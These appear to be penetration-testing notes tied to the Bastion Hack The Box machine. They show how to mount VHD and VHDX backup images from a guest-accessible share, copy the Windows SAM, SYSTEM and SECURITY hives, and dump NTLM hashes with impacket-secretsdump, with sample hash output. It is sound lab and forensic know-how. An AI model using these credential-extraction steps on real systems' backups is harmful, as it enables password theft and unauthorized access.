# Mounting VHD and VHDX Files

[Bastion HTB](https://app.hackthebox.com/machines/Bastion)

- Virtual Hard Disk (VHD) and Virtual Hard Disk X (VHDX) files are used by Windows for virtual machines, backups, and system snapshots. These files can contain the SAM and SYSTEM registry hives, which store password hashes and other sensitive information.  

- Mounting VHD/VHDX files allows you to extract these files and extract password hashes using tools like `impacket-secretsdump`.


## Mounting VHD Files

### Step 1: Install Necessary Tools

- Install the required packages:

```bash
apt install libguestfs-tools guestmount cifs-utils
```


### Step 2: Mount the Network Share

- Mount the network share containing the VHD file:

```bash
mount -t cifs //192.168.1.25/backup -o user=guest,password= /mnt/backup
```


### Step 3: Mount the VHD File

- Use `guestmount` to mount the VHD file in read-only mode:

```bash
guestmount --add /mnt/backup/vhdfile.vhd --inspector --ro /mnt/vhd -v
```

> Alternatively, you can mount a specific VHD file directly:

```bash
guestmount -a /mnt/d1/system.vhd -i -r /mnt/d2 -v
```


### Step 4: Extract SAM and SYSTEM Files

- Copy the SAM and SYSTEM files:

```bash
cp /mnt/vhd/Windows/System32/config/SAM /tmp/
```

```bash
cp /mnt/vhd/Windows/System32/config/SYSTEM /tmp/
```


### Step 5: Extract Password Hashes

- Use `impacket-secretsdump` to extract password hashes:

```bash
impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM local
```


## Mounting VHDX Files

### Step 1: Install Necessary Tools

- Install the required packages:

```bash
apt install cifs-utils libguestfs-tools nautilus qemu-utils nbd-client
```


### Step 2: Load NBD Module

- Check if the `nbd` module is loaded:

```bash
lsmod | grep nbd
```

- If not loaded, load it manually:

```bash
modprobe nbd
```

- If needed, unload and reload the module:

```bash
rmmod nbd
```

```bash
modprobe nbd
```

- Verify that the module is loaded:

```bash
lsmod | grep nbd
```


### Step 3: Check Available NBD Devices

- List available NBD devices:

```bash
ls /dev/nbd*
```

```bash
ls -l /dev/nbd*
```


### Step 4: Identify the Connected Drives

- Check connected drives and partitions:

```bash
lsblk
```

```bash
blkid
```


### Step 5: Attach the VHDX File to NBD

- Use `qemu-nbd` to connect the VHDX file:

```bash
qemu-nbd -c /dev/nbd0 /tmp/808c101a-1a78-11ec-80b5-806e6f6e6963.vhdx
```


### Step 6: Read Partition Table

- Read the partition table using `partprobe`:

```bash
partprobe
```

```bash
partprobe /dev/nbd0
```


### Step 7: Confirm Partition Mapping

- Check the partitions:

```bash
ls /dev/nbd*
```

> Example Output:

```text
nbd0    nbd0p1  nbd0p2
```


### Step 8: Mount the Partition

- Mount the partition containing the SAM and SYSTEM files:

```bash
mount -t ntfs /dev/nbd0p2 /mnt/
```


### Step 9: Extract SAM, SYSTEM, and SECURITY Files

- Navigate to the `config` directory and copy the registry hives:

```bash
cd /mnt/d1/Windows/System32/config
```

```bash
cp SAM SECURITY SYSTEM /home/armour/Downloads
```

### Step 10: Extract Password Hashes

- Use `impacket-secretsdump` to extract password hashes:

```bash
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

> Sample `impacket-secretsdump` output:

```text
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x9dbb07b7aa3fe060815fd1612fd7ce89
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
[*] Cleaning up...
```


## Tools Overview

|Tool|Purpose|
|---|---|
|impacket-secretsdump|Extracts NTLM/LM hashes from SAM files.|
|guestmount|Mounts VHD files in read-only mode.|
|qemu-nbd|Mounts VHDX files via NBD devices.|
|partprobe|Reads partition tables from mounted devices.|
|lsblk|Lists information about available block devices.|
|hashcat|Cracks NTLM/LM hashes.|
|john|Cracks NTLM/LM hashes using wordlists or rules.|


## Conclusion

- Mounting and extracting password hashes from VHD and VHDX files is a valuable technique for penetration testing and forensic analysis. Tools like `impacket-secretsdump`, `guestmount`, and `qemu-nbd` simplify the process and allow you to extract sensitive credentials from Windows systems.

## Related
- [Password Mining](Password-Mining.md) — parent hub
- [SAM and SYSTEM files](SAM-and-SYSTEM-files.md) — hives recovered from mounted images
- [NTDS.DIT Active Directory Domain](NTDS.DIT-Active-Directory-Domain.md) — AD database recovered from backups/images
- [Windows Privilege Escalation](../README.md) — escalation context
